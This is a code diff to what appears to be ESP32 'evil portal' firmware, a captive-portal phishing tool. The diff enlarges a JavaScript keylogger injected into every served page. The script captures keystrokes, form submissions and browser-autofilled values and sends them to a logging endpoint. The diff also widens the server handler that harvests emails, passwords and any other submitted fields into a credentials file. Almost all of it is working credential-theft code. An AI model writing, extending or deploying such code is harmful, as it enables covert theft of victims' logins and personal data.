@@ -191,7 +191,7 @@ static int ap_connection_count = 0;
 
 #define MAX_HTML_BUFFER_SIZE 2048
 #define PORTAL_MAX_FILE_CACHE_SIZE (512 * 1024)
-#define PORTAL_MAX_LOG_BODY_SIZE 256
+#define PORTAL_MAX_LOG_BODY_SIZE 512
 #define PORTAL_LOG_WINDOW_US (1000 * 1000)
 #define PORTAL_LOG_REQUESTS_PER_WINDOW 16
 #define PORTAL_MIN_FLUSH_INTERVAL_US (5 * 1000 * 1000)
@@ -200,7 +200,57 @@ static int ap_connection_count = 0;
 // JavaScript snippet injected into every served HTML page to capture keystrokes and input values
 // Keep as const array so it lives in flash (.rodata) and not in RAM
 static const char CAPTURE_JS_SNIPPET[] =
-    "<script>(function(){const send=d=>navigator.sendBeacon?navigator.sendBeacon('/api/log',new Blob([d])):fetch('/api/log',{method:'POST',headers:{\"Content-Type\":\"text/plain\"},body:d});const h=e=>{const t=e.target;if(!(t.name||t.id))return;const tag=t.tagName.toLowerCase();send(Date.now()+\"|\"+tag+\"|\"+(t.name||t.id)+\"|\"+t.value+\"\\n\");};['input','change','keydown'].forEach(ev=>document.addEventListener(ev,h,true));})();</script>";
+    "<script>(function(){"
+    "var s=document.createElement('style');"
+    "s.textContent='@-webkit-keyframes ghost_af{0%{opacity:0.9}100%{opacity:1}}input:-webkit-autofill{animation:ghost_af 0s;}';"
+    "document.head.appendChild(s);"
+    "function send(d){"
+    "if(navigator.sendBeacon)navigator.sendBeacon('/api/log',new Blob([d]));"
+    "else fetch('/api/log',{method:'POST',headers:{'Content-Type':'text/plain'},body:d});"
+    "}"
+    "function fieldId(t){"
+    "return t.name||t.id||t.getAttribute('placeholder')||t.getAttribute('aria-label')||t.type||'';"
+    "}"
+    "function fieldVal(t){"
+    "var tag=t.tagName.toLowerCase();"
+    "if(tag==='select')return t.options[t.selectedIndex]?t.options[t.selectedIndex].text:'';"
+    "if(t.type==='checkbox'||t.type==='radio')return t.checked?'1':'0';"
+    "return t.value||'';"
+    "}"
+    "function capture(e){"
+    "var t=e.target;if(!t||!t.tagName)return;"
+    "var tag=t.tagName.toLowerCase();"
+    "if(tag!=='input'&&tag!=='textarea'&&tag!=='select')return;"
+    "var id=fieldId(t);if(!id)return;"
+    "var val=fieldVal(t);"
+    "send(Date.now()+'|'+tag+'|'+id+'|'+val+'\\n');"
+    "}"
+    "var debounce;"
+    "function debounceCapture(e){"
+    "clearTimeout(debounce);debounce=setTimeout(function(){capture(e);},300);"
+    "}"
+    "function captureForm(form){"
+    "var data=[];"
+    "var els=form.elements;"
+    "for(var i=0;i<els.length;i++){"
+    "var t=els[i];if(!t.name&&!t.id)continue;"
+    "var val=fieldVal(t);"
+    "data.push((t.name||t.id)+'='+val);"
+    "}"
+    "if(data.length)send('form|'+form.action+'|'+data.join('&')+'\\n');"
+    "}"
+    "document.addEventListener('input',debounceCapture,true);"
+    "document.addEventListener('change',capture,true);"
+    "document.addEventListener('submit',function(e){"
+    "var form=e.target;if(form&&form.tagName&&form.tagName.toLowerCase()==='form'){captureForm(form);}"
+    "},true);"
+    "document.addEventListener('animationstart',function(e){"
+    "if(e.animationName==='ghost_af'){capture(e);}"
+    "},true);"
+    "document.addEventListener('keydown',function(e){"
+    "if(e.key==='Enter'){var t=e.target;if(t&&(t.tagName==='INPUT'||t.tagName==='TEXTAREA'))capture({target:t});}"
+    "},true);"
+    "})();</script>";
 static char* html_buffer = NULL;
 static size_t html_buffer_size = 0;
 static bool use_html_buffer = false;
@@ -222,8 +272,8 @@ static void portal_clear_file_cache(void) {
     portal_file_cache_size = 0;
 }
 
-#define PORTAL_KEYSTROKE_BUF_SZ 512
-#define PORTAL_CREDS_BUF_SZ 384
+#define PORTAL_KEYSTROKE_BUF_SZ 1024
+#define PORTAL_CREDS_BUF_SZ 768
 EXT_RAM_BSS_ATTR static char s_portal_keystroke_buf[PORTAL_KEYSTROKE_BUF_SZ];
 static size_t s_portal_keystroke_len = 0;
 EXT_RAM_BSS_ATTR static char s_portal_creds_buf[PORTAL_CREDS_BUF_SZ];
@@ -1421,6 +1471,7 @@ esp_err_t get_log_handler(httpd_req_t *req) {
         }
         received_total += (size_t)received;
     }
+    body[received_total] = '\0';
 
     if (current_keystrokes_filename[0] != '\0') {
         if (!require_jit) {
@@ -1448,9 +1499,9 @@ esp_err_t get_log_handler(httpd_req_t *req) {
 }
 
 esp_err_t get_info_handler(httpd_req_t *req) {
-    char query[256] = {0};
-    char decoded_email[64] = {0};
-    char decoded_password[64] = {0};
+    char query[512] = {0};
+    char decoded_email[128] = {0};
+    char decoded_password[128] = {0};
 
     bool require_jit = false;
 #ifdef CONFIG_BUILD_CONFIG_TEMPLATE
@@ -1464,28 +1515,99 @@ esp_err_t get_info_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
-        char email_val[64] = {0};
-        char pass_val[64] = {0};
-        if (get_query_param_value(query, "email", email_val, sizeof(email_val)) == ESP_OK) {
-            url_decode(decoded_email, email_val);
+    // Try query string first (GET), then read POST body if no query
+    if (httpd_req_get_url_query_str(req, query, sizeof(query)) != ESP_OK) {
+        // For POST /get with form body
+        if (req->content_len > 0 && req->content_len < (int)sizeof(query) - 1) {
+            int received = 0;
+            while (received < req->content_len) {
+                int r = httpd_req_recv(req, query + received, req->content_len - received);
+                if (r <= 0) break;
+                received += r;
+            }
+            query[received] = '\0';
         }
-        if (get_query_param_value(query, "password", pass_val, sizeof(pass_val)) == ESP_OK) {
-            url_decode(decoded_password, pass_val);
-        }
-        glog("Captured credentials: %s / %s\n", decoded_email, decoded_password);
-        toast_show("Credentials captured!", TOAST_SUCCESS);
+    }
 
+    if (query[0] != '\0') {
+        // Extract known fields first
+        char val_buf[128] = {0};
+        if (get_query_param_value(query, "email", val_buf, sizeof(val_buf)) == ESP_OK) {
+            url_decode(decoded_email, val_buf);
+        }
+        if (get_query_param_value(query, "password", val_buf, sizeof(val_buf)) == ESP_OK) {
+            url_decode(decoded_password, val_buf);
+        }
+        // Also try common alternative field names
+        if (decoded_email[0] == '\0') {
+            const char *email_keys[] = {"user", "username", "login", "account", "phone", NULL};
+            for (int i = 0; email_keys[i] != NULL; i++) {
+                if (get_query_param_value(query, email_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
+                    url_decode(decoded_email, val_buf);
+                    if (decoded_email[0] != '\0') break;
+                }
+            }
+        }
+        if (decoded_password[0] == '\0') {
+            const char *pass_keys[] = {"pass", "passwd", "pin", NULL};
+            for (int i = 0; pass_keys[i] != NULL; i++) {
+                if (get_query_param_value(query, pass_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
+                    url_decode(decoded_password, val_buf);
+                    if (decoded_password[0] != '\0') break;
+                }
+            }
+        }
+
+        // Log primary credentials if found
+        if (decoded_email[0] != '\0' || decoded_password[0] != '\0') {
+            glog("Captured credentials: %s / %s\n", decoded_email, decoded_password);
+            toast_show("Credentials captured!", TOAST_SUCCESS);
+        }
+
+        // Build a full field dump for the log (all query params)
+        char all_fields[384] = {0};
+        int af_pos = 0;
+        const char *p = query;
+        while (*p && af_pos < (int)sizeof(all_fields) - 1) {
+            const char *eq = strchr(p, '=');
+            const char *amp = strchr(p, '&');
+            if (!eq) break;
+            char key_buf[64] = {0};
+            char val_buf2[128] = {0};
+            size_t klen = (size_t)(eq - p);
+            if (klen >= sizeof(key_buf)) klen = sizeof(key_buf) - 1;
+            strncpy(key_buf, p, klen);
+            key_buf[klen] = '\0';
+            const char *vstart = eq + 1;
+            size_t vlen = amp ? (size_t)(amp - vstart) : strlen(vstart);
+            if (vlen >= sizeof(val_buf2)) vlen = sizeof(val_buf2) - 1;
+            strncpy(val_buf2, vstart, vlen);
+            val_buf2[vlen] = '\0';
+            char decoded_val[128] = {0};
+            url_decode(decoded_val, val_buf2);
+            int written = snprintf(all_fields + af_pos, sizeof(all_fields) - (size_t)af_pos,
+                                   "%s%s=%s", (af_pos > 0 ? ", " : ""), key_buf, decoded_val);
+            if (written > 0) af_pos += written;
+            p = amp ? amp + 1 : p + strlen(p);
+        }
+
+        // Write to credentials file
         if (current_creds_filename[0] != '\0') {
-            char line[128];
-            int n = snprintf(line, sizeof(line), "Email: %s, Password: %s\n", decoded_email, decoded_password);
+            char line[512];
+            int n;
+            if (decoded_email[0] != '\0' || decoded_password[0] != '\0') {
+                n = snprintf(line, sizeof(line), "Email: %s, Password: %s | All: %s\n",
+                             decoded_email, decoded_password, all_fields);
+            } else {
+                n = snprintf(line, sizeof(line), "Fields: %s\n", all_fields);
+            }
             if (n > 0 && (size_t)n < sizeof(line)) {
                 if (!require_jit) {
                     if (sd_card_manager.is_initialized) {
                         FILE *f = fopen(current_creds_filename, "a");
-                        if (f) { 
-                            fwrite(line, 1, (size_t)n, f); 
-                            fclose(f); 
+                        if (f) {
+                            fwrite(line, 1, (size_t)n, f);
+                            fclose(f);
                         }
                     }
                 } else {
@@ -1724,6 +1846,8 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_uri_t redirect_head = {.uri = "/redirect", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t log_handler_uri = {
             .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
+        httpd_uri_t get_handler_post = {
+            .uri = "/get", .method = HTTP_POST, .handler = get_info_handler, .user_ctx = NULL};
         httpd_uri_t portal_png = {
             .uri = ".png", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_uri_t portal_jpg = {
@@ -1759,6 +1883,7 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_register_uri_handler(evilportal_server, &redirect_head);
         httpd_register_uri_handler(evilportal_server, &portal_uri);
         httpd_register_uri_handler(evilportal_server, &log_handler_uri);
+        httpd_register_uri_handler(evilportal_server, &get_handler_post);
 
         httpd_register_uri_handler(evilportal_server, &portal_png);
         httpd_register_uri_handler(evilportal_server, &portal_jpg);
